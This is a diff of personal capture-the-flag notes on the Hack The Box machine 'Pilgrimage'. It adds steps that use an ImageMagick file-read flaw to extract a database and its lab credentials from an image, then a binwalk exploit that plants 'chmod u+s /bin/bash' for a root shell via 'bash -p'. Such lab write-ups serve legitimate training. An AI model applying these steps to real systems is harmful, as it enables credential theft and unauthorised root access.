@@ -191,10 +191,16 @@ Shellcodes: No Results
 - download converted file `cursed.png`
 - Analyze the resized image
 - `identify -verbose cursed.png`
-- Convert hex to str
-- 
-- 
+- send text from analyzed image to a new file
+- `identify -verbose shrunk.png > shunkHex.txt'
+- remove all but the hex from the file, do not include the short line of text at the top of it
+- use xxd to convert from hex to str
+	- username / password from /var/db/pilgrimage
+	- emily / abigchonkyboi123
 ```bash
+ ✘ kali@kali  ~/htb/pilgrimage/CVE-2022-44268   master ±  xxd -r -p shrunkHex.txt
+e8|StableimagesimagesCREATE TABLE images (url TEXT PRIMARY KEY NOT NULL, original TEXT NOT NULL, username TEXT NOT NULL)+?indexsqlite_autoindex_image-emilyabigchonkyboi123sersCREATE TABLE users (username TEXT PRIMARY KEY NOT NULL, password TEXT NOT NULL))=indexsqlite_autoindex_users_1users
+        emily
 
 ```
 
@@ -298,6 +304,7 @@ pspy64                            100%[=========================================
 	- `2025/01/31 10:47:08 CMD: UID=0     PID=768    | /bin/bash /usr/sbin/malwarescan.sh `
 - navigating to /bin/bash /usr/sbin/malwarescan.sh  
 	- reveals inotifywait running something called binwalk
+	- on filename=/var/www/pilgrimage.htb/shrunk/
 ```bash
 emily@pilgrimage:~$ cat /usr/sbin/malwarescan.sh                          
 #!/bin/bash                                                                                                                         
@@ -325,10 +332,13 @@ https://github.com/ReFirmLabs/binwalk
 - searching for binwalk vulnerabilities
 	- [Binwalk v2.3.2 - Remote Command Execution (RCE) ](https://www.exploit-db.com/exploits/51249)
 	- [CVE-2022-4510-WalkingPath](https://github.com/adhikara13/CVE-2022-4510-WalkingPath) 
+- move to /var/www/pilgrimage.htb/shrunk
+- copy walkingpath code from git hub into a new file
+- `python3 walkingpath.py command --command "chmod u+s /bin/bash" input.png`
 - Using walking path to create command 'chmod u+s /bin/bash'
 - apply suid to bash, 
-- then watch -n 1.0 ls -ld /bin/bash, 
-- then run bash -p when permissions change
+- then `watch -n 1.0 ls -ld /bin/bash`, 
+- then run `bash -p` when permissions change
 
 
 
